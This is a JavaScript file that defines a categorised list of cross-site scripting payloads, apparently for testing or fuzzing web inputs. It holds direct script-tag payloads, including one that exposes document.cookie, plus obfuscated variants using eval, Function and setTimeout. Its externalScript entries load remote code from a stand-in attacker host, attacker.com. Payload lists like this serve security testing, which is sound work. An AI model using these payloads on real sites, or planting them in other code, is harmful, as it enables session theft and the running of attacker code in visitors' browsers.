const XSS = {
  Execution: {
    BasicScriptExecution: {
      direct: [
        "<script>alert(1)</script>",
        "<script>alert(document.domain)</script>",
        "<script>alert(document.cookie)</script>",
        "<script>confirm(1)</script>",
        "<script>prompt(1)</script>",
        "<script>console.log(1)</script>"
      ],

      externalScript: [
        "<script src=//attacker.com/x.js></script>",
        "<script src=https://attacker.com/x.js></script>"
      ],

      inlineVariants: [
        "<script>alert`1`</script>",
        "<script>window.alert(1)</script>",
        "<script>this</script>"
      ],

      obfuscated: [
        "<script>eval('alert(1)')</script>",
        "<script>Function('alert(1)')()</script>",
        "<script>setTimeout('alert(1)')</script>"
      ]
    }
  }
};
